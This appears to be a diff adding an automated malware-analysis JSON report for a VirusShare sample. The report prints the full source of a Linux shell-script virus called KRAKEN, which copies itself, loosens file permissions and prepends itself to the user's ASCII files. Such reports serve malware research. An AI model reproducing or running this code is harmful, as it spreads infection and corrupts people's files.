@@ -1,0 +1,65 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#KRAKEN\nif [ \"@$1\" != \"@virbkg\" ] \nthen\nusuario=`logname` \nhead -34 $0 > /tmp/virus.txt\nchmod 777 /tmp/virus.txt\n/tmp/virus.txt virbkg $usuario & \nelse\nusuario=$2 \nfind . -name \"*\" -print | while read archivo\ndo\nif [ -f $archivo ]\nthen\ndueno=`ls -l \"$archivo\" | awk '{printf $3}'`\nif [ \"$dueno\" = \"$usuario\" ]\nthen\nchmod 755 \"$archivo\";\nfi\nif [ -r \"$archivo\" -a -w \"$archivo\" ]\nthen\nfile \"$archivo\" | while read p1 p2 p3 p4 p5 p6\ndo\nif [ \"$p2\" = \"ASCII\" -a \"`head -1 \"$archivo\"`\" != \"#KRAKEN\" ]\nthen\ncp /tmp/virus.txt /tmp/temporal.txt\ncat $archivo >> /tmp/temporal.txt\ncat /tmp/temporal.txt > $archivo\nfi\ndone\nfi\nfi\ndone\nrm -f /tmp/virus.txt /tmp/temporal.txt\nfi\necho \"Usted ejecuto un script infectado con el virus KRAKEN para Linux.\" "
+    },
+    "filename": "VirusShare_1639feecf70fffa4361fa6eadebc631b",
+    "filesize": 771,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1639feecf70fffa4361fa6eadebc631b",
+        "sha1": "de9a3972be0cb6f5e5992afe96893066b0802202",
+        "sha256": "2df71c9b0530ded4de0b97adfc63f70980c151ae4936901f1f7fc45d02208095"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#KRAKEN",
+            "if [ \"@$1\" != \"@virbkg\" ] ",
+            "then",
+            "usuario=`logname` ",
+            "head -34 $0 > /tmp/virus.txt",
+            "chmod 777 /tmp/virus.txt",
+            "/tmp/virus.txt virbkg $usuario & ",
+            "else",
+            "usuario=$2 ",
+            "find . -name \"*\" -print | while read archivo",
+            "if [ -f $archivo ]",
+            "then",
+            "dueno=`ls -l \"$archivo\" | awk '{printf $3}'`",
+            "if [ \"$dueno\" = \"$usuario\" ]",
+            "then",
+            "chmod 755 \"$archivo\";",
+            "if [ -r \"$archivo\" -a -w \"$archivo\" ]",
+            "then",
+            "file \"$archivo\" | while read p1 p2 p3 p4 p5 p6",
+            "if [ \"$p2\" = \"ASCII\" -a \"`head -1 \"$archivo\"`\" != \"#KRAKEN\" ]",
+            "then",
+            "cp /tmp/virus.txt /tmp/temporal.txt",
+            "cat $archivo >> /tmp/temporal.txt",
+            "cat /tmp/temporal.txt > $archivo",
+            "done",
+            "done",
+            "rm -f /tmp/virus.txt /tmp/temporal.txt",
+            "echo \"Usted ejecuto un script infectado con el virus KRAKEN para Linux.\" "
+        ],
+        "file": {
+            "cat $archivo >> /tmp/temporal.txt": "Text",
+            "chmod 777 /tmp/virus.txt": "Text",
+            "cp /tmp/virus.txt /tmp/temporal.txt": "Text",
+            "head -34 $0 > /tmp/virus.txt": "Text",
+            "rm -f /tmp/virus.txt /tmp/temporal.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262065",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
